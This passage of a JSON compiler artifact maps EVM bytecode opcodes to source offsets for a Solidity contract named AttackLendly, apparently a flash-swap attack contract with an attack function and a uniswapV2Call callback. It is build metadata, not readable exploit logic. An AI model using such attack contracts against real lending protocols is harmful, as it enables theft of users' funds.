      "fn": null,
      "offset": [
        569,
        3564
      ],
      "op": "JUMPI",
      "path": "3"
    },
    "43": {
      "fn": null,
      "offset": [
        569,
        3564
      ],
      "op": "DUP1",
      "path": "3"
    },
    "44": {
      "fn": null,
      "offset": [
        569,
        3564
      ],
      "op": "PUSH4",
      "path": "3",
      "value": "0x715018A6"
    },
    "49": {
      "fn": null,
      "offset": [
        569,
        3564
      ],
      "op": "EQ",
      "path": "3"
    },
    "50": {
      "fn": null,
      "offset": [
        569,
        3564
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0x71"
    },
    "53": {
      "fn": null,
      "offset": [
        569,
        3564
      ],
      "op": "JUMPI",
      "path": "3"
    },
    "54": {
      "fn": null,
      "offset": [
        569,
        3564
      ],
      "op": "DUP1",
      "path": "3"
    },
    "55": {
      "fn": null,
      "offset": [
        569,
        3564
      ],
      "op": "PUSH4",
      "path": "3",
      "value": "0x8DA5CB5B"
    },
    "60": {
      "fn": null,
      "offset": [
        569,
        3564
      ],
      "op": "EQ",
      "path": "3"
    },
    "61": {
      "fn": null,
      "offset": [
        569,
        3564
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0x79"
    },
    "64": {
      "fn": null,
      "offset": [
        569,
        3564
      ],
      "op": "JUMPI",
      "path": "3"
    },
    "65": {
      "fn": null,
      "offset": [
        569,
        3564
      ],
      "op": "DUP1",
      "path": "3"
    },
    "66": {
      "fn": null,
      "offset": [
        569,
        3564
      ],
      "op": "PUSH4",
      "path": "3",
      "value": "0x9E5FAAFC"
    },
    "71": {
      "fn": null,
      "offset": [
        569,
        3564
      ],
      "op": "EQ",
      "path": "3"
    },
    "72": {
      "fn": null,
      "offset": [
        569,
        3564
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0x98"
    },
    "75": {
      "fn": null,
      "offset": [
        569,
        3564
      ],
      "op": "JUMPI",
      "path": "3"
    },
    "76": {
      "fn": null,
      "offset": [
        569,
        3564
      ],
      "op": "DUP1",
      "path": "3"
    },
    "77": {
      "fn": null,
      "offset": [
        569,
        3564
      ],
      "op": "PUSH4",
      "path": "3",
      "value": "0xF2FDE38B"
    },
    "82": {
      "fn": null,
      "offset": [
        569,
        3564
      ],
      "op": "EQ",
      "path": "3"
    },
    "83": {
      "fn": null,
      "offset": [
        569,
        3564
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0xA0"
    },
    "86": {
      "fn": null,
      "offset": [
        569,
        3564
      ],
      "op": "JUMPI",
      "path": "3"
    },
    "87": {
      "fn": null,
      "offset": [
        569,
        3564
      ],
      "op": "JUMPDEST",
      "path": "3"
    },
    "88": {
      "fn": null,
      "offset": [
        569,
        3564
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x0"
    },
    "90": {
      "fn": null,
      "offset": [
        569,
        3564
      ],
      "op": "DUP1",
      "path": "3"
    },
    "91": {
      "first_revert": true,
      "fn": null,
      "offset": [
        569,
        3564
      ],
      "op": "REVERT",
      "path": "3"
    },
    "92": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        1780,
        3379
      ],
      "op": "JUMPDEST",
      "path": "3"
    },
    "93": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        1780,
        3379
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0x6F"
    },
    "96": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        1780,
        3379
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0x6A"
    },
    "99": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        1780,
        3379
      ],
      "op": "CALLDATASIZE",
      "path": "3"
    },
    "100": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        1780,
        3379
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x4"
    },
    "102": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        1780,
        3379
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0xD24"
    },
    "105": {
      "fn": "AttackLendly.uniswapV2Call",
      "jump": "i",
      "offset": [
        1780,
        3379
      ],
      "op": "JUMP",
      "path": "3"
    },
    "106": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        1780,
        3379
      ],
      "op": "JUMPDEST",
      "path": "3"
    },
    "107": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        1780,
        3379
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0xB3"
    },
    "110": {
      "fn": "AttackLendly.uniswapV2Call",
      "jump": "i",
      "offset": [
        1780,
        3379
      ],
      "op": "JUMP",
      "path": "3"
    },
    "111": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        1780,
        3379
      ],
      "op": "JUMPDEST",
      "path": "3"
    },
    "112": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        1780,
        3379
      ],
      "op": "STOP",
      "path": "3"
    },
    "113": {
      "fn": "Ownable.renounceOwnership",
      "offset": [
        1831,
        1932
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "114": {
      "fn": "Ownable.renounceOwnership",
      "offset": [
        1831,
        1932
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x6F"
    },
    "117": {
      "fn": "Ownable.renounceOwnership",
      "offset": [
        1831,
        1932
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x660"
    },
    "120": {
      "fn": "Ownable.renounceOwnership",
      "jump": "i",
      "offset": [
        1831,
        1932
      ],
      "op": "JUMP",
      "path": "0"
    },
    "121": {
      "fn": "Ownable.owner",
      "offset": [
        1201,
        1286
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "122": {
      "fn": "Ownable.owner",
      "offset": [
        1247,
        1254
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "124": {
      "fn": "Ownable.owner",
      "offset": [
        1273,
        1279
      ],
      "op": "SLOAD",
      "path": "0",
      "statement": 0
    },
    "125": {
      "fn": "Ownable.owner",
      "offset": [
        1201,
        1286
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "127": {
      "fn": "Ownable.owner",
      "offset": [
        1201,
        1286
      ],
      "op": "DUP1",
      "path": "0"
    },
    "128": {
      "fn": "Ownable.owner",
      "offset": [
        1201,
        1286
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "129": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "131": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "133": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "135": {
      "op": "SHL"
    },
    "136": {
      "op": "SUB"
    },
    "137": {
      "fn": "Ownable.owner",
      "offset": [
        1273,
        1279
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "138": {
      "fn": "Ownable.owner",
      "offset": [
        1273,
        1279
      ],
      "op": "SWAP3",
      "path": "0"
    },
    "139": {
      "fn": "Ownable.owner",
      "offset": [
        1273,
        1279
      ],
      "op": "AND",
      "path": "0"
    },
    "140": {
      "op": "DUP3"
    },
    "141": {
      "op": "MSTORE"
    },
    "142": {
      "fn": "Ownable.owner",
      "offset": [
        1201,
        1286
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "143": {
      "fn": "Ownable.owner",
      "offset": [
        1201,
        1286
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "144": {
      "fn": "Ownable.owner",
      "offset": [
        1201,
        1286
      ],
      "op": "DUP2",
      "path": "0"
    },
    "145": {
      "fn": "Ownable.owner",
      "offset": [
        1201,
        1286
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "146": {
      "fn": "Ownable.owner",
      "offset": [
        1201,
        1286
      ],
      "op": "SUB",
      "path": "0"
    },
    "147": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "149": {
      "fn": "Ownable.owner",
      "offset": [
        1201,
        1286
      ],
      "op": "ADD",
      "path": "0"
    },
    "150": {
      "fn": "Ownable.owner",
      "offset": [
        1201,
        1286
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "151": {
      "fn": "Ownable.owner",
      "offset": [
        1201,
        1286
      ],
      "op": "RETURN",
      "path": "0"
    },
    "152": {
      "fn": "AttackLendly.attack",
      "offset": [
        1067,
        1774
      ],
      "op": "JUMPDEST",
      "path": "3"
    },
    "153": {
      "fn": "AttackLendly.attack",
      "offset": [
        1067,
        1774
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0x6F"
    },
    "156": {
      "fn": "AttackLendly.attack",
      "offset": [
        1067,
        1774
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0x674"
    },
    "159": {
      "fn": "AttackLendly.attack",
      "jump": "i",
      "offset": [
        1067,
        1774
      ],
      "op": "JUMP",
      "path": "3"
    },
    "160": {
      "fn": "Ownable.transferOwnership",
      "offset": [
        2081,
        2279
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "161": {
      "fn": "Ownable.transferOwnership",
      "offset": [
        2081,
        2279
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x6F"
    },
    "164": {
      "fn": "Ownable.transferOwnership",
      "offset": [
        2081,
        2279
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xAE"
    },
    "167": {
      "fn": "Ownable.transferOwnership",
      "offset": [
        2081,
        2279
      ],
      "op": "CALLDATASIZE",
      "path": "0"
    },
    "168": {
      "fn": "Ownable.transferOwnership",
      "offset": [
        2081,
        2279
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "170": {
      "fn": "Ownable.transferOwnership",
      "offset": [
        2081,
        2279
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xDBA"
    },
    "173": {
      "fn": "Ownable.transferOwnership",
      "jump": "i",
      "offset": [
        2081,
        2279
      ],
      "op": "JUMP",
      "path": "0"
    },
    "174": {
      "fn": "Ownable.transferOwnership",
      "offset": [
        2081,
        2279
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "175": {
      "fn": "Ownable.transferOwnership",
      "offset": [
        2081,
        2279
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x97B"
    },
    "178": {
      "fn": "Ownable.transferOwnership",
      "jump": "i",
      "offset": [
        2081,
        2279
      ],
      "op": "JUMP",
      "path": "0"
    },
    "179": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        1780,
        3379
      ],
      "op": "JUMPDEST",
      "path": "3"
    },
    "180": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        1977,
        1987
      ],
      "op": "CALLER",
      "path": "3",
      "statement": 1
    },
    "181": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "183": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "185": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "187": {
      "op": "SHL"
    },
    "188": {
      "op": "SUB"
    },
    "189": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        1999,
        2003
      ],
      "op": "PUSH32",
      "path": "3",
      "value": "0x0"
    },
    "222": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        1977,
        2004
      ],
      "op": "AND",
      "path": "3"
    },
    "223": {
      "branch": 31,
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        1977,
        2004
      ],
      "op": "EQ",
      "path": "3"
    },
    "224": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        1969,
        2017
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0x11B"
    },
    "227": {
      "branch": 31,
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        1969,
        2017
      ],
      "op": "JUMPI",
      "path": "3"
    },
    "228": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        1969,
        2017
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x40"
    },
    "230": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        1969,
        2017
      ],
      "op": "MLOAD",
      "path": "3"
    },
    "231": {
      "op": "PUSH3",
      "value": "0x461BCD"
    },
    "235": {
      "op": "PUSH1",
      "value": "0xE5"
    },
    "237": {
      "op": "SHL"
    },
    "238": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        1969,
        2017
      ],
      "op": "DUP2",
      "path": "3"
    },
    "239": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        1969,
        2017
      ],
      "op": "MSTORE",
      "path": "3"
    },
    "240": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "242": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        1969,
        2017
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x4"
    },
    "244": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        1969,
        2017
      ],
      "op": "DUP3",
      "path": "3"
    },
    "245": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        1969,
        2017
      ],
      "op": "ADD",
      "path": "3"
    },
    "246": {
      "op": "MSTORE"
    },
    "247": {
      "op": "PUSH1",
      "value": "0x8"
    },
    "249": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "251": {
      "op": "DUP3"
    },
    "252": {
      "op": "ADD"
    },
    "253": {
      "op": "MSTORE"
    },
    "254": {
      "op": "PUSH8",
      "value": "0x3737BA103830B4B9"
    },
    "263": {
      "op": "PUSH1",
      "value": "0xC1"
    },
    "265": {
      "op": "SHL"
    },
    "266": {
      "op": "PUSH1",
      "value": "0x44"
    },
    "268": {
      "op": "DUP3"
    },
    "269": {
      "op": "ADD"
    },
    "270": {
      "op": "MSTORE"
    },
    "271": {
      "op": "PUSH1",
      "value": "0x64"
    },
    "273": {
      "op": "ADD"
    },
    "274": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        1969,
        2017
      ],
      "op": "JUMPDEST",
      "path": "3"
    },
    "275": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        1969,
        2017
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x40"
    },
    "277": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        1969,
        2017
      ],
      "op": "MLOAD",
      "path": "3"
    },
    "278": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        1969,
        2017
      ],
      "op": "DUP1",
      "path": "3"
    },
    "279": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        1969,
        2017
      ],
      "op": "SWAP2",
      "path": "3"
    },
    "280": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        1969,
        2017
      ],
      "op": "SUB",
      "path": "3"
    },
    "281": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        1969,
        2017
      ],
      "op": "SWAP1",
      "path": "3"
    },
    "282": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        1969,
        2017
      ],
      "op": "REVERT",
      "optimizer_revert": true,
      "path": "3"
    },
    "283": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        1969,
        2017
      ],
      "op": "JUMPDEST",
      "path": "3"
    },
    "284": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "286": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "288": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "290": {
      "op": "SHL"
    },
    "291": {
      "op": "SUB"
    },
    "292": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2035,
        2058
      ],
      "op": "DUP6",
      "path": "3",
      "statement": 2
    },
    "293": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2035,
        2058
      ],
      "op": "AND",
      "path": "3"
    },
    "294": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2053,
        2057
      ],
      "op": "ADDRESS",
      "path": "3"
    },
    "295": {
      "branch": 32,
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2035,
        2058
      ],
      "op": "EQ",
      "path": "3"
    },
    "296": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2027,
        2073
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0x160"
    },
    "299": {
      "branch": 32,
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2027,
        2073
      ],
      "op": "JUMPI",
      "path": "3"
    },
    "300": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2027,
        2073
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x40"
    },
    "302": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2027,
        2073
      ],
      "op": "MLOAD",
      "path": "3"
    },
    "303": {
      "op": "PUSH3",
      "value": "0x461BCD"
    },
    "307": {
      "op": "PUSH1",
      "value": "0xE5"
    },
    "309": {
      "op": "SHL"
    },
    "310": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2027,
        2073
      ],
      "op": "DUP2",
      "path": "3"
    },
    "311": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2027,
        2073
      ],
      "op": "MSTORE",
      "path": "3"
    },
    "312": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "314": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2027,
        2073
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x4"
    },
    "316": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2027,
        2073
      ],
      "op": "DUP3",
      "path": "3"
    },
    "317": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2027,
        2073
      ],
      "op": "ADD",
      "path": "3"
    },
    "318": {
      "op": "MSTORE"
    },
    "319": {
      "op": "PUSH1",
      "value": "0xA"
    },
    "321": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "323": {
      "op": "DUP3"
    },
    "324": {
      "op": "ADD"
    },
    "325": {
      "op": "MSTORE"
    },
    "326": {
      "op": "PUSH10",
      "value": "0x3737BA1039B2B73232B9"
    },
    "337": {
      "op": "PUSH1",
      "value": "0xB1"
    },
    "339": {
      "op": "SHL"
    },
    "340": {
      "op": "PUSH1",
      "value": "0x44"
    },
    "342": {
      "op": "DUP3"
    },
    "343": {
      "op": "ADD"
    },
    "344": {
      "op": "MSTORE"
    },
    "345": {
      "op": "PUSH1",
      "value": "0x64"
    },
    "347": {
      "op": "ADD"
    },
    "348": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2027,
        2073
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0x112"
    },
    "351": {
      "op": "JUMP"
    },
    "352": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2027,
        2073
      ],
      "op": "JUMPDEST",
      "path": "3"
    },
    "353": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2160,
        2172
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x0"
    },
    "355": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2182,
        2209
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0x16E"
    },
    "358": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2182,
        2209
      ],
      "op": "DUP3",
      "path": "3"
    },
    "359": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2182,
        2209
      ],
      "op": "DUP5",
      "path": "3"
    },
    "360": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2182,
        2209
      ],
      "op": "ADD",
      "path": "3"
    },
    "361": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2193,
        2197
      ],
      "op": "DUP5",
      "path": "3"
    },
    "362": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2182,
        2209
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0xDBA"
    },
    "365": {
      "fn": "AttackLendly.uniswapV2Call",
      "jump": "i",
      "offset": [
        2182,
        2209
      ],
      "op": "JUMP",
      "path": "3"
    },
    "366": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2182,
        2209
      ],
      "op": "JUMPDEST",
      "path": "3"
    },
    "367": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2160,
        2210
      ],
      "op": "SWAP1",
      "path": "3"
    },
    "368": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2160,
        2210
      ],
      "op": "POP",
      "path": "3"
    },
    "369": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2237,
        2243
      ],
      "op": "PUSH32",
      "path": "3",
      "statement": 3,
      "value": "0x0"
    },
    "402": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "404": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "406": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "408": {
      "op": "SHL"
    },
    "409": {
      "op": "SUB"
    },
    "410": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2228,
        2243
      ],
      "op": "AND",
      "path": "3"
    },
    "411": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2228,
        2233
      ],
      "op": "DUP2",
      "path": "3"
    },
    "412": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "414": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "416": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "418": {
      "op": "SHL"
    },
    "419": {
      "op": "SUB"
    },
    "420": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2228,
        2243
      ],
      "op": "AND",
      "path": "3"
    },
    "421": {
      "branch": 33,
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2228,
        2243
      ],
      "op": "EQ",
      "path": "3"
    },
    "422": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2228,
        2262
      ],
      "op": "DUP1",
      "path": "3"
    },
    "423": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2228,
        2262
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0x1E1"
    },
    "426": {
      "branch": 33,
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2228,
        2262
      ],
      "op": "JUMPI",
      "path": "3"
    },
    "427": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2228,
        2262
      ],
      "op": "POP",
      "path": "3"
    },
    "428": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2256,
        2262
      ],
      "op": "PUSH32",
      "path": "3",
      "value": "0x0"
    },
    "461": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "463": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "465": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "467": {
      "op": "SHL"
    },
    "468": {
      "op": "SUB"
    },
    "469": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2247,
        2262
      ],
      "op": "AND",
      "path": "3"
    },
    "470": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2247,
        2252
      ],
      "op": "DUP2",
      "path": "3"
    },
    "471": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "473": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "475": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "477": {
      "op": "SHL"
    },
    "478": {
      "op": "SUB"
    },
    "479": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2247,
        2262
      ],
      "op": "AND",
      "path": "3"
    },
    "480": {
      "branch": 34,
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2247,
        2262
      ],
      "op": "EQ",
      "path": "3"
    },
    "481": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2228,
        2262
      ],
      "op": "JUMPDEST",
      "path": "3"
    },
    "482": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2220,
        2278
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0x21B"
    },
    "485": {
      "branch": 34,
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2220,
        2278
      ],
      "op": "JUMPI",
      "path": "3"
    },
    "486": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2220,
        2278
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x40"
    },
    "488": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2220,
        2278
      ],
      "op": "MLOAD",
      "path": "3"
    },
    "489": {
      "op": "PUSH3",
      "value": "0x461BCD"
    },
    "493": {
      "op": "PUSH1",
      "value": "0xE5"
    },
    "495": {
      "op": "SHL"
    },
    "496": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2220,
        2278
      ],
      "op": "DUP2",
      "path": "3"
    },
    "497": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2220,
        2278
      ],
      "op": "MSTORE",
      "path": "3"
    },
    "498": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "500": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2220,
        2278
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x4"
    },
    "502": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2220,
        2278
      ],
      "op": "DUP3",
      "path": "3"
    },
    "503": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2220,
        2278
      ],
      "op": "ADD",
      "path": "3"
    },
    "504": {
      "op": "MSTORE"
    },
    "505": {
      "op": "PUSH1",
      "value": "0xB"
    },
    "507": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "509": {
      "op": "DUP3"
    },
    "510": {
      "op": "ADD"
    },
    "511": {
      "op": "MSTORE"
    },
    "512": {
      "op": "PUSH11",
      "value": "0x3BB937B733903A37B5B2B7"
    },
    "524": {
      "op": "PUSH1",
      "value": "0xA9"
    },
    "526": {
      "op": "SHL"
    },
    "527": {
      "op": "PUSH1",
      "value": "0x44"
    },
    "529": {
      "op": "DUP3"
    },
    "530": {
      "op": "ADD"
    },
    "531": {
      "op": "MSTORE"
    },
    "532": {
      "op": "PUSH1",
      "value": "0x64"
    },
    "534": {
      "op": "ADD"
    },
    "535": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2220,
        2278
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0x112"
    },
    "538": {
      "op": "JUMP"
    },
    "539": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2220,
        2278
      ],
      "op": "JUMPDEST",
      "path": "3"
    },
    "540": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2289,
        2303
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x0"
    },
    "542": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2306,
        2318
      ],
      "op": "DUP6",
      "path": "3"
    },
    "543": {
      "branch": 35,
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2306,
        2318
      ],
      "op": "ISZERO",
      "path": "3"
    },
    "544": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2306,
        2338
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0x229"
    },
    "547": {
      "branch": 35,
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2306,
        2338
      ],
      "op": "JUMPI",
      "path": "3"
    },
    "548": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2331,
        2338
      ],
      "op": "DUP6",
      "path": "3"
    },
    "549": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2306,
        2338
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0x22B"
    },
    "552": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2306,
        2338
      ],
      "op": "JUMP",
      "path": "3"
    },
    "553": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2306,
        2338
      ],
      "op": "JUMPDEST",
      "path": "3"
    },
    "554": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2321,
        2328
      ],
      "op": "DUP5",
      "path": "3"
    },
    "555": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2306,
        2338
      ],
      "op": "JUMPDEST",
      "path": "3"
    },
    "556": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2289,
        2338
      ],
      "op": "SWAP1",
      "path": "3"
    },
    "557": {
      "op": "POP"
    },
    "558": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2387,
        2408
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x0"
    },
    "560": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2424,
        2428
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0x3E8"
    },
    "563": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2411,
        2421
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0x23D"
    },
    "566": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2289,
        2338
      ],
      "op": "DUP4",
      "path": "3"
    },
    "567": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2420,
        2421
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x1"
    },
    "569": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2411,
        2421
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0xDDE"
    },
    "572": {
      "fn": "AttackLendly.uniswapV2Call",
      "jump": "i",
      "offset": [
        2411,
        2421
      ],
      "op": "JUMP",
      "path": "3"
    },
    "573": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2411,
        2421
      ],
      "op": "JUMPDEST",
      "path": "3"
    },
    "574": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2411,
        2428
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0x247"
    },
    "577": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2411,
        2428
      ],
      "op": "SWAP2",
      "path": "3"
    },
    "578": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2411,
        2428
      ],
      "op": "SWAP1",
      "path": "3"
    },
    "579": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2411,
        2428
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0xE0B"
    },
    "582": {
